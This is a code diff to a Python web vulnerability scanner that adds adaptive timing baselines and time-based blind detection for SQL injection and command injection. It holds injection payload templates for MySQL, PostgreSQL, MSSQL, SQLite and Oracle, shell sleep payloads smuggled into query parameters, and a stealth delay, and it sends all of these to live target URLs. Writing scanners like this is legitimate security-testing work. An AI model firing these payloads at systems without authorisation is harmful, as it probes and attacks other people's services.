@@ -8175,6 +8175,88 @@ def _detect_input_context(body: str, param_value: str) -> str:
 
 
 # ─────────────────────────────────────────────
+# Statistical timing infrastructure
+# ─────────────────────────────────────────────
+# Used by SQLi time-based blind and CMDi blind timing phases.
+# Replaces fixed _SQLI_TIME_THRESHOLD with per-endpoint adaptive thresholds.
+
+import collections as _collections
+
+_TimingProfile = _collections.namedtuple(
+    "_TimingProfile", ["mean_ms", "std_ms", "max_ms", "valid"]
+)
+
+# Cache: (base, params_frozen) → (_TimingProfile, cache_epoch_s)
+_timing_profiles: dict = {}
+_TIMING_PROFILE_TTL = 60   # seconds before re-profiling
+
+
+def _get_timing_profile(base: str, params: dict, n: int = 5) -> "_TimingProfile":
+    """
+    Send *n* baseline requests to *base* with cache-busting params and compute
+    mean / std / max response times.  Returns a _TimingProfile.
+
+    Profile is cached per (base, params) for _TIMING_PROFILE_TTL seconds.
+    Returns _TimingProfile(valid=False) when std_ms > 500 (noisy link) or
+    all requests fail.
+    """
+    key = (base, frozenset(params.items()))
+    cached = _timing_profiles.get(key)
+    if cached:
+        profile, ts = cached
+        if time.monotonic() - ts < _TIMING_PROFILE_TTL:
+            return profile
+
+    orig_query = "&".join(f"{k}={v}" for k, v in params.items())
+    samples: list[float] = []
+    for i in range(n):
+        try:
+            # cache-buster so responses are not served from proxy/CDN cache
+            sep = "&" if orig_query else ""
+            url = base + "?" + orig_query + sep + f"_nst={i}"
+            t0  = time.monotonic()
+            _get_session().get(
+                url,
+                headers=create_request_header(),
+                timeout=15,
+                allow_redirects=True,
+            )
+            samples.append((time.monotonic() - t0) * 1000.0)
+        except Exception:
+            pass
+
+    if not samples:
+        profile = _TimingProfile(mean_ms=0, std_ms=0, max_ms=0, valid=False)
+        _timing_profiles[key] = (profile, time.monotonic())
+        return profile
+
+    mean_ms = sum(samples) / len(samples)
+    variance = sum((s - mean_ms) ** 2 for s in samples) / len(samples)
+    std_ms  = variance ** 0.5
+    max_ms  = max(samples)
+
+    if std_ms > 500:
+        print(timestamp() + f" [Timing] Noisy baseline for {base} "
+              f"(σ={std_ms:.0f}ms > 500ms) — skipping time-based probing")
+        profile = _TimingProfile(mean_ms=mean_ms, std_ms=std_ms, max_ms=max_ms, valid=False)
+    else:
+        profile = _TimingProfile(mean_ms=mean_ms, std_ms=std_ms, max_ms=max_ms, valid=True)
+
+    _timing_profiles[key] = (profile, time.monotonic())
+    return profile
+
+
+def _timing_threshold(profile: "_TimingProfile", delay_s: float) -> float:
+    """
+    Return the minimum elapsed-ms that counts as a confirmed delay for a
+    payload that asks the server to sleep *delay_s* seconds.
+
+    Formula: mean_ms + 3*std_ms + delay_s*1000
+    """
+    return profile.mean_ms + 3.0 * profile.std_ms + delay_s * 1000.0
+
+
+# ─────────────────────────────────────────────
 # Path traversal detection
 # ─────────────────────────────────────────────
 
@@ -9389,12 +9471,35 @@ _SQLI_ERROR_PAYLOADS = [
     ";--",
 ]
 
-# Time-based (blind) payloads — flag HIGH if response time > 5 s
+# Time-based (blind) payload templates — {N} is replaced by actual delay seconds.
+# Keyed by DB type; "generic" is the fallback tried when DB is unknown.
+_SQLI_TIMING_TEMPLATES: dict = {
+    "mysql":      ["' OR SLEEP({N})--",                 "1 OR SLEEP({N})--"],
+    "postgresql": ["' OR pg_sleep({N})--",              "1; SELECT pg_sleep({N})--"],
+    "mssql":      ["'; WAITFOR DELAY '0:0:{N}'--",      "1; WAITFOR DELAY '0:0:{N}'--"],
+    "sqlite":     ["' OR randomblob({BLOB})--"],
+    "oracle":     ["' OR 1=1 AND {N}=dbms_pipe.receive_message(chr(0),{N})--"],
+    "generic":    ["' OR SLEEP({N})--",                 "'; WAITFOR DELAY '0:0:{N}'--"],
+}
+
+# Map error-string fingerprint (from Phase 1) → DB key in _SQLI_TIMING_TEMPLATES
+_SQLI_HINT_TO_DB: dict = {
+    "mysql_fetch":       "mysql",
+    "SQL syntax":        "mysql",
+    "Warning: mysql":    "mysql",
+    "PostgreSQL ERROR":  "postgresql",
+    "Warning: pg_":      "postgresql",
+    "Microsoft OLE DB":  "mssql",
+    "ODBC SQL Server":   "mssql",
+    "SQLite3::":         "sqlite",
+    "ORA-":              "oracle",
+}
+
+# Legacy list kept for callers that still reference it (unused by Phase 2)
 _SQLI_TIME_PAYLOADS = [
     "' OR SLEEP(5)--",
     "'; WAITFOR DELAY '0:0:5'--",
 ]
-_SQLI_TIME_THRESHOLD = 5.0   # seconds
 
 # DB-specific time payloads — keyed by the error string that fingerprints the DB.
 # Used to prioritise the right payload once an error response reveals the DB type.
@@ -9551,53 +9656,123 @@ def check_sqli(page_url: str, html_content) -> None:
             if domain in _sqli_domains:
                 break
 
-            # ── Phase 2: time-based (blind) ──────────────────────────────────
-            # Use DB-specific payloads first when the error phase fingerprinted the DB
-            if _db_hint and _db_hint in _SQLI_CTX_DB_PAYLOADS:
-                db_payloads = _SQLI_CTX_DB_PAYLOADS[_db_hint]
-                time_payloads = db_payloads + [p for p in _SQLI_TIME_PAYLOADS
-                                               if p not in db_payloads]
-                print(timestamp() + f" [Context] SQLi param={param} DB hint: "
-                      f"{_db_hint!r} — prioritising DB-specific time payloads")
-            else:
-                time_payloads = _SQLI_TIME_PAYLOADS
+            # ── Phase 2: time-based (blind) — statistical 3-probe ────────────
+            # Select DB-specific payload templates based on Phase-1 fingerprint.
+            db_key = _SQLI_HINT_TO_DB.get(_db_hint or "") if _db_hint else None
+            if db_key:
+                print(timestamp() + f" [Timing] SQLi param={param} DB hint: "
+                      f"{_db_hint!r} → {db_key} templates")
+            templates = _SQLI_TIMING_TEMPLATES.get(db_key or "generic",
+                                                    _SQLI_TIMING_TEMPLATES["generic"])
 
-            for payload in time_payloads:
-                new_query = "&".join(
-                    f"{k}={orig_val + payload}" if k == param else f"{k}={v}"
+            # Build a timing profile from baseline requests
+            tp = _get_timing_profile(base, params)
+            if not tp.valid:
+                # Noisy or unreachable — skip time-based probing for this param
+                continue
+
+            print(timestamp() + f" [Timing] Baseline {base} param={param}: "
+                  f"mean={tp.mean_ms:.0f}ms σ={tp.std_ms:.0f}ms max={tp.max_ms:.0f}ms")
+
+            # Three escalating delays: 2s / 4s / 6s
+            _PROBE_DELAYS = [2, 4, 6]
+            _confirmed_probes = 0
+            _probe_log: list[str] = []
+            _winning_payload: str | None = None
+            _winning_elapsed: float = 0.0
+
+            for template in templates:
+                if _confirmed_probes >= 2 or domain in _sqli_domains:
+                    break
+                _confirmed_probes = 0
+                _probe_log = []
+
+                for delay_s in _PROBE_DELAYS:
+                    if domain in _sqli_domains:
+                        break
+
+                    # Build payload — substitute {N} and {BLOB} placeholders
+                    blob_val = str(500_000_000 * delay_s // 10)
+                    payload = template.replace("{N}", str(delay_s)).replace("{BLOB}", blob_val)
+
+                    new_query = "&".join(
+                        f"{k}={orig_val + payload}" if k == param else f"{k}={v}"
+                        for k, v in params.items()
+                    )
+                    test_url = base + "?" + new_query
+                    threshold_ms = _timing_threshold(tp, delay_s)
+
+                    try:
+                        stealth_delay(domain)
+                        t0      = time.monotonic()
+                        _get_session().get(
+                            test_url,
+                            headers=create_request_header(),
+                            timeout=max(delay_s + 10, 20),
+                            allow_redirects=True,
+                        )
+                        elapsed_ms = (time.monotonic() - t0) * 1000.0
+                    except Exception:
+                        elapsed_ms = 0.0
+
+                    hit = elapsed_ms >= threshold_ms
+                    _probe_log.append(
+                        f"Probe(SLEEP {delay_s}): {elapsed_ms:.0f}ms "
+                        f"(threshold {threshold_ms:.0f}ms) {'✓' if hit else '✗'}"
+                    )
+                    if hit:
+                        _confirmed_probes += 1
+                        if _winning_payload is None:
+                            _winning_payload = payload
+                            _winning_elapsed = elapsed_ms
+                    else:
+                        # Proportional scaling: stop if probe misses badly
+                        break
+
+                if _confirmed_probes >= 1:
+                    break   # found a confirming template — use it
+
+            timing_log = (
+                f"Baseline: {tp.mean_ms:.0f}ms ±{tp.std_ms:.0f}ms | "
+                + " | ".join(_probe_log)
+                + (" → CONFIRMED" if _confirmed_probes >= 2 else
+                   " → WEAK" if _confirmed_probes == 1 else " → NOT TRIGGERED")
+            )
+            print(timestamp() + f" [Timing] {timing_log}")
+
+            if _confirmed_probes >= 1 and _winning_payload:
+                if _confirmed_probes >= 3:
+                    sev, label = "HIGH",   "CONFIRMED"
+                elif _confirmed_probes == 2:
+                    sev, label = "HIGH",   "CONFIRMED"
+                else:
+                    sev, label = "MEDIUM", "WEAK"
+
+                _tu = base + "?" + "&".join(
+                    f"{k}={orig_val + _winning_payload}" if k == param else f"{k}={v}"
                     for k, v in params.items()
                 )
-                test_url = base + "?" + new_query
-                try:
-                    stealth_delay(domain)
-                    t0   = time.monotonic()
-                    resp = _get_session().get(
-                        test_url,
-                        headers=create_request_header(),
-                        timeout=10,
-                        allow_redirects=True,
-                    )
-                    elapsed = time.monotonic() - t0
-                    if elapsed >= _SQLI_TIME_THRESHOLD:
-                        _tu = test_url
-                        _timing = [0.0]
+                _tp_ref = tp
+                _wd = _PROBE_DELAYS[0]
+                _timing = [0.0]
 
-                        def _re_time(_u=_tu, _t=_timing):
-                            _t0 = time.monotonic()
-                            r = _get_session().get(_u, headers=create_request_header(), timeout=10, allow_redirects=True)
-                            _t[0] = time.monotonic() - _t0
-                            return r
+                def _re_time_sqli(_u=_tu, _t=_timing, _tp=_tp_ref, _d=_wd):
+                    _t0 = time.monotonic()
+                    r   = _get_session().get(_u, headers=create_request_header(),
+                                             timeout=max(_d + 10, 20), allow_redirects=True)
+                    _t[0] = (time.monotonic() - _t0) * 1000.0
+                    return r
 
-                        _msv_verify(
-                            "HIGH", "SQL INJECTION (TIME-BASED BLIND CANDIDATE)", domain,
-                            f"Parameter '{param}' on {base} delayed {elapsed:.1f}s (>{_SQLI_TIME_THRESHOLD}s) "
-                            f"with time-based payload: {payload!r} — manual verification required{waf_note}",
-                            _re_time,
-                            lambda r, _t=_timing: _t[0] >= _SQLI_TIME_THRESHOLD,
-                        )
-                        break
-                except Exception:
-                    pass
+                _msv_verify(
+                    sev, "SQL INJECTION (TIME-BASED BLIND)", domain,
+                    f"Parameter '{param}' on {base} | {timing_log} | "
+                    f"Winning payload: {_winning_payload!r}{waf_note}",
+                    _re_time_sqli,
+                    lambda r, _t=_timing, _tp=_tp_ref, _d=_wd:
+                        _t[0] >= _timing_threshold(_tp, _d),
+                )
+                if sev == "HIGH":
+                    _sqli_domains.add(domain)
 
 
 # ─────────────────────────────────────────────
@@ -9843,6 +10018,113 @@ def check_cmdi(page_url: str, html_content) -> None:
                                 break
                 except Exception:
                     pass
+
+            if domain in _cmdi_domains:
+                continue
+
+            # ── CMDi Phase 2: blind timing ────────────────────────────────────
+            # Only run when canary-based Phase 1 found nothing.
+            # Uses `; sleep {N}` / `| sleep {N}` / `$(sleep {N})` variants.
+            _CMDI_SLEEP_TEMPLATES = [
+                "; sleep {N}",
+                "| sleep {N}",
+                "$(sleep {N})",
+                "`sleep {N}`",
+            ]
+            _PROBE_DELAYS_CMDI = [2, 4, 6]
+
+            tp = _get_timing_profile(base, params)
+            if not tp.valid:
+                continue
+
+            _confirmed_cmdi = 0
+            _cmdi_probe_log: list[str] = []
+            _cmdi_winning_payload: str | None = None
+            _cmdi_winning_elapsed: float = 0.0
+
+            for sleep_tmpl in _CMDI_SLEEP_TEMPLATES:
+                if _confirmed_cmdi >= 2 or domain in _cmdi_domains:
+                    break
+                _confirmed_cmdi = 0
+                _cmdi_probe_log = []
+
+                for delay_s in _PROBE_DELAYS_CMDI:
+                    if domain in _cmdi_domains:
+                        break
+                    payload = sleep_tmpl.replace("{N}", str(delay_s))
+                    new_query = "&".join(
+                        f"{k}={orig_val + payload}" if k == param else f"{k}={v}"
+                        for k, v in params.items()
+                    )
+                    test_url = base + "?" + new_query
+                    threshold_ms = _timing_threshold(tp, delay_s)
+
+                    try:
+                        stealth_delay(domain)
+                        t0 = time.monotonic()
+                        _get_session().get(
+                            test_url,
+                            headers=create_request_header(),
+                            timeout=max(delay_s + 10, 20),
+                            allow_redirects=True,
+                        )
+                        elapsed_ms = (time.monotonic() - t0) * 1000.0
+                    except Exception:
+                        elapsed_ms = 0.0
+
+                    hit = elapsed_ms >= threshold_ms
+                    _cmdi_probe_log.append(
+                        f"Probe(sleep {delay_s}): {elapsed_ms:.0f}ms "
+                        f"(threshold {threshold_ms:.0f}ms) {'✓' if hit else '✗'}"
+                    )
+                    if hit:
+                        _confirmed_cmdi += 1
+                        if _cmdi_winning_payload is None:
+                            _cmdi_winning_payload = payload
+                            _cmdi_winning_elapsed = elapsed_ms
+                    else:
+                        break   # proportional scaling: stop if miss
+
+                if _confirmed_cmdi >= 1:
+                    break
+
+            cmdi_timing_log = (
+                f"Baseline: {tp.mean_ms:.0f}ms ±{tp.std_ms:.0f}ms | "
+                + " | ".join(_cmdi_probe_log)
+                + (" → CONFIRMED" if _confirmed_cmdi >= 2 else
+                   " → WEAK" if _confirmed_cmdi == 1 else " → NOT TRIGGERED")
+            )
+            if _confirmed_cmdi >= 1:
+                print(timestamp() + f" [Timing] CMDi {cmdi_timing_log}")
+
+            if _confirmed_cmdi >= 1 and _cmdi_winning_payload:
+                sev = "HIGH" if _confirmed_cmdi >= 2 else "MEDIUM"
+
+                _tu = base + "?" + "&".join(
+                    f"{k}={orig_val + _cmdi_winning_payload}" if k == param else f"{k}={v}"
+                    for k, v in params.items()
+                )
+                _tp_ref = tp
+                _wd = _PROBE_DELAYS_CMDI[0]
+                _timing = [0.0]
+
+                def _re_time_cmdi(_u=_tu, _t=_timing, _tp=_tp_ref, _d=_wd):
+                    _t0 = time.monotonic()
+                    r   = _get_session().get(_u, headers=create_request_header(),
+                                             timeout=max(_d + 10, 20), allow_redirects=True)
+                    _t[0] = (time.monotonic() - _t0) * 1000.0
+                    return r
+
+                _msv_verify(
+                    sev, "COMMAND INJECTION (TIME-BASED BLIND)", domain,
+                    f"Parameter '{param}' on {base} | {cmdi_timing_log} | "
+                    f"Winning payload: {_cmdi_winning_payload!r}{waf_note}",
+                    _re_time_cmdi,
+                    lambda r, _t=_timing, _tp=_tp_ref, _d=_wd:
+                        _t[0] >= _timing_threshold(_tp, _d),
+                )
+                if sev == "HIGH":
+                    _cmdi_domains.add(domain)
 
 
 # ─────────────────────────────────────────────
@@ -12598,6 +12880,7 @@ def _reset_per_domain_state() -> None:
     global _ldapi_tested, _ldapi_form_tested
     global _deserial_passive_seen, _deserial_active_tested
     global _price_tested, _jwt_tested, _hpp_tested, _wcp_tested, _probe_baseline, _entropy_seen
+    global _timing_profiles
     global _idor_tested, _takeover_checked, _s3_checked, _s3_permutation_checked
     global _subdomain_enriched, _ct_queried, _cookie_seen, _js_analysis_threads
     _zone_transfer_checked  = set()
@@ -12650,6 +12933,7 @@ def _reset_per_domain_state() -> None:
     _wcp_tested             = set()
     _probe_baseline         = {}
     _entropy_seen           = set()
+    _timing_profiles        = {}
     _idor_tested            = set()
     _takeover_checked       = set()
     _s3_checked             = set()
